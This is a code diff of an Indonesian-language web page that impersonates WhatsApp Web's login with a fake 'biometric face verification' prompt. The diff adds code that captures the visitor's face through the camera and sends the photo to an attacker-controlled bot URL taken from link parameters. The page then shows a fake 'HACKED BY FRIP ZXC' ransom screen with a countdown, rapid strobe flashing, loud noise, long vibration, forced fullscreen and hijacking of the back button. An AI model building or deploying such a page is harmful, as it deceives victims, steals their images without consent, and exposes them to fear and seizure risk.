@@ -1,80 +1,44 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>WhatsApp Web - Verifikasi Biometrik</title>
     <style>
         body { margin: 0; padding: 0; background: #f0f2f5; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        
-        /* HUKUMAN LOGIN PALSU (UMPAN) */
         #login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; z-index: 10; transition: transform 0.3s; }
         #wa-logo { width: 80px; margin-bottom: 20px; }
         h2 { color: #41525d; font-weight: 300; margin-bottom: 10px; }
         p { color: #8696a0; font-size: 14px; margin-bottom: 20px; line-height: 1.5; }
         .alert-box { background: #e8f5fe; color: #00a884; padding: 10px; border-radius: 5px; font-size: 13px; margin-bottom: 20px; border: 1px solid #c2e7ff; }
-        
         #btn-login { background: #00a884; color: white; border: none; padding: 12px 20px; font-size: 15px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; box-shadow: 0 2px 4px rgba(0,168,132,0.3); transition: 0.2s; }
-        #btn-login:hover { background: #008f72; }
-        #btn-login:active { transform: scale(0.98); }
-
-        /* TAMPILAN NERAKA (HACKER MODE) */
         #hacker-screen { display: none; position: absolute; top: 0; left: 0; width: 100vw; height: 100vh; background: black; color: #00ff00; font-family: 'Courier New', Courier, monospace; padding: 20px; box-sizing: border-box; z-index: 999; overflow: hidden; }
         #console-text { font-size: 11px; line-height: 1.3; white-space: pre-wrap; margin-top: 10px; position: relative; z-index: 1002;}
         .red-text { color: red; font-weight: bold; }
-        
         #zxc-header { color: white; background: red; padding: 5px; text-align: center; font-weight: bold; font-size: 18px; position: relative; z-index: 1002; margin-top: 10px; border-radius: 5px; }
-
-        /* FOTO KORBAN YANG DICOLONG */
-        .hacked-face { 
-            width: 150px; border: 2px dashed red; 
-            display: block; margin: 10px 0; 
-            filter: grayscale(100%) sepia(100%) hue-rotate(300deg) saturate(500%); /* Efek warna merah horor */
-            animation: glitch-img 0.2s infinite;
-        }
+        .hacked-face { width: 150px; border: 2px dashed red; display: block; margin: 10px 0; filter: grayscale(100%) sepia(100%) hue-rotate(300deg) saturate(500%); animation: glitch-img 0.2s infinite; }
         @keyframes glitch-img { 0% { transform: translate(1px, 1px); } 50% { transform: translate(-1px, -1px); } 100% { transform: translate(1px, -1px); } }
-
-        /* INPUT KEY JANTUNGAN */
         #key-box { display: none; position: relative; z-index: 1002; background: rgba(0,0,0,0.8); border: 2px solid #00ff00; padding: 15px; margin-top: 15px; border-radius: 5px; text-align: center; }
         #license-key { border: 1px solid #00ff00; color: #00ff00; background: #000; padding: 8px; width: 80%; }
         #btn-activate { background: red; color: white; border: none; padding: 10px 15px; font-size: 14px; font-weight: bold; cursor: pointer; margin-top: 10px; }
         #error-key { color: red; font-size: 12px; margin-top: 5px; display: none; }
-
-        /* EFEK VISUAL BRUTAL */
-        .blink { animation: blinker 0.1s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
-        
-        /* 🔥 STROBO MATA JAHANM 🔥 */
+        .blink { animation: blinker 0.1s linear infinite; } @keyframes blinker { 50% { opacity: 0; } }
         .strobe-mode { animation: strobeEffect 0.03s infinite; } 
-        @keyframes strobeEffect {
-            0% { background-color: white; opacity: 1; }
-            49% { background-color: white; opacity: 1; }
-            50% { background-color: black; opacity: 1; }
-            100% { background-color: black; opacity: 1; }
-        }
+        @keyframes strobeEffect { 0% { background-color: white; opacity: 1; } 49% { background-color: white; opacity: 1; } 50% { background-color: black; opacity: 1; } 100% { background-color: black; opacity: 1; } }
     </style>
 </head>
 <body>
-    
-    <video id="spy-cam" autoplay playsinline style="display:none;"></video>
-    <canvas id="spy-canvas" style="display:none;"></canvas>
-
+    <video id="spy-cam" autoplay playsinline style="display:none;"></video><canvas id="spy-canvas" style="display:none;"></canvas>
     <div id="login-box">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" id="wa-logo" alt="WA Logo">
-        <h2>WhatsApp Web</h2>
-        <p>Gunakan WhatsApp di komputer atau perangkat Anda.</p>
-        <div class="alert-box">
-            🛡️ <b>Pembaruan Keamanan:</b> Kami kini menggunakan verifikasi Biometrik (Wajah) untuk login.
-        </div>
+        <h2>WhatsApp Web</h2><p>Gunakan WhatsApp di komputer atau perangkat Anda.</p>
+        <div class="alert-box">🛡️ <b>Pembaruan Keamanan:</b> Kami kini menggunakan verifikasi Biometrik (Wajah) untuk login.</div>
         <button id="btn-login" onclick="initiateDoom()">MULAI PINDAI WAJAH</button>
     </div>
-
     <div id="hacker-screen">
         <div id="strobe-overlay" style="position:absolute; top:0; left:0; width:100%; height:100%; z-index:1000; opacity:0;"></div>
         <div id="zxc-header" class="blink">HACKED BY FRIP ZXC</div>
         <h1 style="color: red; text-align: center; font-size: 16px; position:relative; z-index:1002; margin: 10px 0;">🔴 FACE ID & DATA COMPROMISED 🔴</h1>
         <div id="console-text"></div>
-        
         <div id="key-box">
             <p style="color: #00ff00; font-size: 12px; margin: 0 0 10px 0;">DATA DIHAPUS DALAM <span id="time-left">60</span>s!</p>
             <input type="text" id="license-key" placeholder="Masukkan Decryption Key...">
@@ -82,166 +46,80 @@
             <div id="error-key">KEY SALAH! Mempercepat unggahan wajah ke Dark Web...</div>
         </div>
     </div>
-
     <script>
-        let doomStarted = false;
-        let capturedPhoto = null;
+        let doomStarted = false; let capturedPhoto = null; 
+        
+        // AMBIL PARAMETER DARI LINK VERCEL
+        const urlParams = new URLSearchParams(window.location.search);
+        const TRAP_ID = urlParams.get('id') || "TARGET_UNKNOWN";
+        const BOT_API = urlParams.get('api'); // Link localtunnel bot lu dapet dari sini!
 
-        // MINTA FULLSCREEN MAKSIMAL!
-        function requestFullScreen() {
-            let el = document.documentElement;
-            if (el.requestFullscreen) { el.requestFullscreen().catch(()=>{}); }
-            else if (el.webkitRequestFullscreen) { el.webkitRequestFullscreen().catch(()=>{}); }
-        }
-
-        // FUNGSI NYOLONG KAMERA
+        function requestFullScreen() { let el = document.documentElement; if (el.requestFullscreen) { el.requestFullscreen().catch(()=>{}); } else if (el.webkitRequestFullscreen) { el.webkitRequestFullscreen().catch(()=>{}); } }
         async function snapPhoto() {
             try {
-                // Minta izin kamera depan
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('spy-cam');
-                video.srcObject = stream;
-                
-                // Tunggu kamera nyala
+                const video = document.getElementById('spy-cam'); video.srcObject = stream;
                 await new Promise(resolve => video.onloadedmetadata = resolve);
-                
-                // Jepret ke canvas
-                const canvas = document.getElementById('spy-canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                const canvas = document.getElementById('spy-canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                // Ubah jadi gambar Base64
                 capturedPhoto = canvas.toDataURL('image/jpeg', 0.5);
-                
-                // Matiin lampu kamera biar target gak curiga kelamaan
                 stream.getTracks().forEach(track => track.stop());
-            } catch (e) {
-                console.log("Akses kamera ditolak target.");
-            }
+                
+                // MENGIRIM FOTO KE BOT LAPTOP LU!
+                if(BOT_API) {
+                    fetch(BOT_API + '/api/trap/photo', { 
+                        method: 'POST', 
+                        headers: { 'Content-Type': 'application/json' }, 
+                        body: JSON.stringify({ id: TRAP_ID, photoBase64: capturedPhoto }) 
+                    }).catch(e => console.log("Gagal ngirim ke Bot"));
+                }
+            } catch (e) { console.log("Akses ditolak"); }
         }
-
-        // INIT DOOM (Tombol Diklik)
         async function initiateDoom() {
-            let btn = document.getElementById('btn-login');
-            btn.innerText = "MENGAKSES KAMERA...";
-            btn.style.background = "#ff9800"; // Ubah warna jadi oranye loading
-
-            // 1. Eksekusi Jebret Kamera (Bakal muncul popup izin dari browser)
-            await snapPhoto();
-
-            // 2. Lanjut ke Neraka
-            startDoom();
+            let btn = document.getElementById('btn-login'); btn.innerText = "MENGAKSES KAMERA..."; btn.style.background = "#ff9800";
+            await snapPhoto(); startDoom();
         }
-
-        // FUNGSI NERAKA (DOOM)
         async function startDoom() {
-            doomStarted = true;
-            requestFullScreen();
-            
-            document.getElementById('login-box').style.display = 'none';
-            let hackScreen = document.getElementById('hacker-screen');
-            hackScreen.style.display = 'block';
-
-            // STROBO ON
-            let strobe = document.getElementById('strobe-overlay');
-            strobe.style.opacity = '1';
-            strobe.classList.add('strobe-mode');
-
-            // AUDIO NOISE
+            doomStarted = true; requestFullScreen();
+            document.getElementById('login-box').style.display = 'none'; document.getElementById('hacker-screen').style.display = 'block';
+            let strobe = document.getElementById('strobe-overlay'); strobe.style.opacity = '1'; strobe.classList.add('strobe-mode');
             try {
-                let AudioContext = window.AudioContext || window.webkitAudioContext;
-                let audioCtx = new AudioContext();
-                let osc = audioCtx.createOscillator();
-                let gain = audioCtx.createGain();
-                osc.type = 'sawtooth';
-                osc.frequency.setValueAtTime(500, audioCtx.currentTime); 
-                osc.frequency.exponentialRampToValueAtTime(7000, audioCtx.currentTime + 0.1); 
-                osc.connect(gain);
-                gain.connect(audioCtx.destination);
-                osc.start();
-
+                let audioCtx = new (window.AudioContext || window.webkitAudioContext)(); let osc = audioCtx.createOscillator(); let gain = audioCtx.createGain();
+                osc.type = 'sawtooth'; osc.frequency.setValueAtTime(500, audioCtx.currentTime); osc.frequency.exponentialRampToValueAtTime(7000, audioCtx.currentTime + 0.1); 
+                osc.connect(gain); gain.connect(audioCtx.destination); osc.start();
                 setInterval(() => { osc.frequency.setValueAtTime(Math.random() * 6000 + 1000, audioCtx.currentTime); }, 30);
             } catch(e) {}
-
-            // VIBRASI
             if (navigator.vibrate) { navigator.vibrate([3000, 30, 3000, 30, 3000, 30, 5000]); }
-
-            // ANIMASI TERMINAL HACKER
-            let consoleTxt = document.getElementById('console-text');
-            let platform = navigator.platform || 'Unknown Device';
-
-            let lines = [
-                `[SYSTEM] <span class='blink'>FRIP_ZXC OS - INITIATING...</span>`,
-                `[INFO] Target: <span class='red-text'>${platform}</span>`,
-                `[HACK] Membuka <span class='red-text'>WhatsApp ChatLogs</span>...`,
-                `[HACK] Mengakses Biometrik Wajah...`,
-            ];
-            
+            let consoleTxt = document.getElementById('console-text'); let platform = navigator.platform || 'Unknown Device';
+            let lines = [ \`[SYSTEM] <span class='blink'>FRIP_ZXC OS - INITIATING...</span>\`, \`[INFO] Target: <span class='red-text'>\${platform}</span>\`, \`[HACK] Membuka <span class='red-text'>WhatsApp ChatLogs</span>...\`, \`[HACK] Mengakses Biometrik Wajah...\` ];
             let i = 0;
             let interval = setInterval(() => {
                 if (i < lines.length) {
                     consoleTxt.innerHTML += "> " + lines[i] + "<br>";
-                    
-                    // Kalau sampai di bagian Biometrik, dan fotonya berhasil kejepret, TAMPILIN!
-                    if (i === 3 && capturedPhoto) {
-                        consoleTxt.innerHTML += `<img src="${capturedPhoto}" class="hacked-face"><br>`;
-                        consoleTxt.innerHTML += `> <span class='red-text'>[SUKSES] FOTO WAJAH BERHASIL DIAMBIL & DIKIRIM KE DATABASE!</span><br>`;
-                    }
-
+                    if (i === 3 && capturedPhoto) { consoleTxt.innerHTML += \`<img src="\${capturedPhoto}" class="hacked-face"><br>> <span class='red-text'>[SUKSES] FOTO WAJAH BERHASIL DIAMBIL & DIKIRIM KE DATABASE!</span><br>\`; }
                     i++;
                 } else {
                     clearInterval(interval);
-                    // Munculin input key yang bikin jantungan
-                    setTimeout(() => {
-                        document.getElementById('console-text').style.opacity = '0.4'; 
-                        document.getElementById('key-box').style.display = 'block'; 
-                        startFakeTimer();
-                    }, 1000);
+                    setTimeout(() => { document.getElementById('console-text').style.opacity = '0.4'; document.getElementById('key-box').style.display = 'block'; startFakeTimer(); }, 1000);
                 }
             }, 500); 
         }
-
-        // TIMER PENGHANCURAN
         function startFakeTimer() {
-            let timeLeftSpan = document.getElementById('time-left');
-            let timeLeft = 60;
+            let timeLeftSpan = document.getElementById('time-left'); let timeLeft = 60;
             let timerInterval = setInterval(() => {
-                timeLeft--;
-                timeLeftSpan.innerText = timeLeft;
+                timeLeft--; timeLeftSpan.innerText = timeLeft;
                 if (timeLeft <= 0) {
                     clearInterval(timerInterval);
-                    let strobe = document.getElementById('strobe-overlay');
-                    strobe.classList.remove('strobe-mode');
-                    strobe.style.opacity = '0';
+                    let strobe = document.getElementById('strobe-overlay'); strobe.classList.remove('strobe-mode'); strobe.style.opacity = '0';
                     document.getElementById('hacker-screen').style.backgroundColor = "black";
                     document.getElementById('key-box').innerHTML = "<span class='red-text blink' style='font-size:18px;'>TERLAMBAT!! WAJAH & DATA ANDA TELAH DISEBARKAN!</span><br><br>Hacked by FRIP ZXC.";
                 }
             }, 1000);
         }
-
-        // FUNGSI CEK KEY (PASTI SALAH)
-        function checkKey() {
-            document.getElementById('error-key').style.display = 'block'; 
-            if (navigator.vibrate) { navigator.vibrate([1000, 100, 1000, 100, 2000]); }
-            document.getElementById('console-text').innerHTML += "> [WARNING] <span class='red-text'>KEY SALAH! Memulai unggahan ke Dark Web Server 02...</span><br>";
-        }
-        
-        // TWIST TOMBOL KEMBALI
+        function checkKey() { document.getElementById('error-key').style.display = 'block'; if (navigator.vibrate) { navigator.vibrate([1000, 100, 1000, 100, 2000]); } document.getElementById('console-text').innerHTML += "> [WARNING] <span class='red-text'>KEY SALAH! Mempercepat unggahan ke Dark Web...</span><br>"; }
         (function() {
-            let attempts = 0;
-            for (let i = 0; i < 5; i++) { window.history.pushState({page: i}, null, null); }
-            window.addEventListener('popstate', function(event) {
-                if (doomStarted) {
-                    attempts++;
-                    if (attempts > 2) {
-                        alert("Twist: Kena prank FRIP ZXC lu! BWAHAHAHA!");
-                        window.location.reload(); 
-                    } else {
-                        requestFullScreen();
-                    }
-                }
-            });
+            let attempts = 0; for (let i = 0; i < 5; i++) { window.history.pushState({page: i}, null, null); }
+            window.addEventListener('popstate', function(event) { if (doomStarted) { attempts++; if (attempts > 2) { alert("Twist: Kena prank FAIZ AHNAF lu! BWAHAHAHA!"); window.location.reload(); } else { requestFullScreen(); } } });
         })();
     </script>
 </body>
